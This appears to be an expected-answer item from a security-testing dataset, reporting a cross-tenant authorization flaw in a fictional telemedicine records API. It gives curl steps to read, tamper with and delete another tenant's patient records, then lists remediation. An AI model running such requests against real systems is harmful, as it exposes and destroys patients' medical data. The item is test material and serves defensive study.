# Expected Response

## System
- System: TeleCare Consultation API v3.3.0
- Domain: TELEMEDICINE / REMOTE CARE
- Example ID: BOLA-0086
- Risk ID: RISK-52-086

## Findings

### 1. Pattern 5.2 — Graph Traversal Injection: Cross-Tenant Consultation Record Access on `/api/v2/records/:id` (HAR Primary)

The `GET/PATCH/DELETE /api/v2/records/:id` endpoint queries by `record_id` only. In Telemedicine/FHIR, consultation records are structured as a graph — each `REC-*` ID references a patient consultation node. Pattern 5.2 "resolver/graph traversal injection" — an attacker injects a cross-tenant `record_id` to traverse from their own consultation node to another patient's protected healthcare record, bypassing tenant isolation. No tenant or ownership check prevents the traversal (RISK-52-086).

In Telemedicine, consultation records contain patient PHI: diagnoses, treatment notes, prescriptions, video session transcripts. Cross-tenant access is a HIPAA §164.312 violation.

**Evidence from HAR:**
- Request: `GET /api/v2/records/REC-2086` from `ORG-43EC` (`X-Tenant-ID: ORG-43EC`)
- Response `tenantId: "ORG-D1FE"` — cross-tenant consultation data returned
- Response `sensitiveData: "CONFIDENTIAL: cross-tenant data for ORG-D1FE"` — patient PHI exposed
- HTTP status: 200 — graph traversal injection succeeded

## Reproduction

**Step 1 — Baseline:**
```bash
curl -s "https://api.telecare-consul.example.com/api/v2/records/REC-1086" \
  -H "Authorization: Bearer <TOKEN_TENANT_ORG-43EC>" \
  -H "X-Tenant-ID: ORG-43EC"
```
**Expected:** Returns own consultation record with `tenantId: "ORG-43EC"`.

**Step 2 — Cross-tenant consultation read: graph traversal (primary HAR attack):**
```bash
curl -s "https://api.telecare-consul.example.com/api/v2/records/REC-2086" \
  -H "Authorization: Bearer <TOKEN_TENANT_ORG-43EC>" \
  -H "X-Tenant-ID: ORG-43EC"
```
**Vulnerable outcome:** Returns `tenantId: "ORG-D1FE"`, `sensitiveData: "CONFIDENTIAL: cross-tenant data for ORG-D1FE"` — another patient's consultation PHI.

**Step 3 — PATCH: corrupt another patient's consultation record:**
```bash
curl -s -X PATCH "https://api.telecare-consul.example.com/api/v2/records/REC-2086" \
  -H "Authorization: Bearer <TOKEN_TENANT_ORG-43EC>" \
  -H "X-Tenant-ID: ORG-43EC" \
  -H "Content-Type: application/json" \
  -d '{"status": "cancelled", "sensitive_data": "consultation_tampered_by_attacker"}'
```
**Vulnerable outcome:** Another patient's active consultation cancelled or diagnosis data corrupted — patient safety risk, HIPAA violation.

**Step 4 — DELETE: delete another patient's consultation record:**
```bash
curl -s -X DELETE "https://api.telecare-consul.example.com/api/v2/records/REC-2086" \
  -H "Authorization: Bearer <TOKEN_TENANT_ORG-43EC>" \
  -H "X-Tenant-ID: ORG-43EC"
```
**Vulnerable outcome:** Patient consultation record deleted — medical record destruction, regulatory violation.

## Secure Outcome
```json
{ "error": "Forbidden", "code": 403 }
```

## Remediation
- Add `WHERE record_id = $id AND owner_id = $jwtSub AND tenant_id = $jwtTenantId` to all record queries (RISK-52-086).
- Validate record ownership before any write (PATCH, DELETE).
- Use non-sequential UUIDs for record IDs to prevent graph traversal enumeration.
- HIPAA audit log: record all access to consultation records with authenticated user identity.
